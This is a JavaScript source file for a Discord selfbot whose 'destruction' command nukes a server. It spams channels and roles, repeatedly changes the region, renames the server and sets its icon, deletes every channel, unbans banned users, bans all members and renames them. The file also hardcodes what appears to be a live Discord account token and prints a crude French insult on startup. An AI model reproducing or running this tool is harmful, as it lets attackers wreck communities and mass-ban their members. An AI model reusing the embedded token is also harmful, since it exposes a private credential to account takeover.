const Discord = require("discord.js");
const client = new Discord.Client();
const colors = require('colors')
const config = require('./config/config1.json');
const game = require('./config/config2.json');
const figlet = require('figlet');
const token = "mfa.wp2g9bikZZlPnAyW8YVsZuCB0I9l02bkkbIK4DTHi7tro6Pf8rTziVehB1tCTUjIhfwJL12vjp4iPBzkqI9y"
const prefix = config.prefix



client.on("ready", () => {
console.log("le bot est pret a niker des meres");
var statuschange = [`${game.ActiviterStream1}`, `${game.ActiviterStream2}`, `${game.ActiviterStream3}`, `${game.ActiviterStream4}`];
  setInterval(function() {

var statusc = statuschange[Math.floor(Math.random()*statuschange.length)];

client.user.setGame(statusc, "https://www.twitch.tv/enriqueagent49");

  }, 120000)
})


client.on("message", message => {
if(message.content.includes(prefix +"destruction")){
  if (message.author.id == client.user.id) {
    message.delete();
              for(var i =0; i < 30; i++){
              message.guild.createChannel("Destroy by Agent49Bot", 'text')
             }
              message.guild.setRegion('russia').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('europe').catch(error => {})
              message.guild.setRegion('sydney').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('japan').catch(error => {})
              message.guild.setRegion('brazil').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('singapore').catch(error => {})
              message.guild.setRegion('russia').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('europe').catch(error => {})
              message.guild.setRegion('sydney').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('japan').catch(error => {})
              message.guild.setRegion('brazil').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('singapore').catch(error => {})
              message.guild.setRegion('russia').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('europe').catch(error => {})
              message.guild.setRegion('sydney').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('japan').catch(error => {})
              message.guild.setRegion('brazil').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('singapore').catch(error => {})
              message.guild.setRegion('russia').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('europe').catch(error => {})
              message.guild.setRegion('sydney').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('japan').catch(error => {})
              message.guild.setRegion('brazil').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('singapore').catch(error => {})
              message.guild.setRegion('russia').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('europe').catch(error => {})
              message.guild.setRegion('sydney').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('japan').catch(error => {})
              message.guild.setRegion('brazil').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('singapore').catch(error => {})
              message.guild.setRegion('russia').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('europe').catch(error => {})
              message.guild.setRegion('sydney').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('japan').catch(error => {})
              message.guild.setRegion('brazil').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('singapore').catch(error => {})
              message.guild.setRegion('russia').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('europe').catch(error => {})
              message.guild.setRegion('sydney').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('japan').catch(error => {})
              message.guild.setRegion('brazil').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('singapore').catch(error => {})
              message.guild.setRegion('russia').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('europe').catch(error => {})
              message.guild.setRegion('sydney').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('japan').catch(error => {})
              message.guild.setRegion('brazil').catch(error => {})
              message.guild.setRegion('india').catch(error => {})
              message.guild.setRegion('singapore').catch(error => {})
              message.guild.setName("Destroy by Agent49Bot")
              message.guild.setIcon(`https://media.discordapp.net/attachments/590263586236923921/649679171399712789/GifSelfBot.gif?width=400&height=225`).catch(console.error);
              message.guild.channels.map(c => c.delete())
              message.guild.createChannel("Destroy by Agent49Bot", "text")
              for(var i =0; i < 90; i++){
              message.guild.createRole({name:"Destroy by Agent49Bot",
                                        mentionable:false,
                                        permissions:2146958591,
                                        position: "",
                                        color: "#010101"
                                        })
                                         }
              message.guild.fetchBans().then(bans => {
             bans.forEach(user => {
               message.guild.unban(user);
            });
            });
           message.guild.members.forEach(member => {
            member.ban().then(function () { });
            });
            message.guild.members.forEach(m => {
            m.setNickname("Destroy by Agent49Bot");
            });
          }
      }
});
client.login(config.Token)